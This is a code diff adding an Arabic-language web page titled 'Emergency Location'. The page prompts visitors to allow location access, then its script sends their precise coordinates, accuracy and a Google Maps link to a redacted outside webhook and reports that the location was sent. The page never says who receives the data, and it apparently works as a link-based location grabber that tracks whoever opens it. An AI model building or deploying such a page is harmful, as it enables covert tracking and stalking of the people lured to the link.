@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Emergency Location</title>
+<style>
+body {
+    margin:0;
+    background:#0f172a;
+    color:white;
+    font-family:Arial,sans-serif;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    min-height:100vh;
+    text-align:center;
+    padding:20px;
+}
+.card {
+    background:#111827;
+    padding:30px;
+    border-radius:20px;
+    max-width:500px;
+    width:100%;
+}
+</style>
+</head>
+<body>
+<div class="card">
+<h1>جاري تحديد الموقع...</h1>
+<p>يرجى الضغط على "السماح" عند ظهور طلب الموقع.</p>
+</div>
+
+<script>
+navigator.geolocation.getCurrentPosition(async (position) => {
+    const lat = position.coords.latitude;
+    const lng = position.coords.longitude;
+    const accuracy = Math.round(position.coords.accuracy);
+
+    const map = `https://www.google.com/maps?q=${lat},${lng}`;
+
+    await fetch("REDACTED_WEBHOOK_URL", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            content:
+`🚨 New Location
+
+Latitude: ${lat}
+Longitude: ${lng}
+Accuracy: ${accuracy}m
+
+Google Maps:
+${map}`
+        })
+    });
+
+    document.body.innerHTML = `
+    <div class="card">
+        <h1>تم إرسال الموقع بنجاح</h1>
+    </div>`;
+},
+(error) => {
+    document.body.innerHTML = `
+    <div class="card">
+        <h1>يجب السماح بالوصول للموقع</h1>
+    </div>`;
+},
+{
+    enableHighAccuracy: true,
+    timeout: 15000,
+    maximumAge: 0
+});
+</script>
+</body>
+</html>
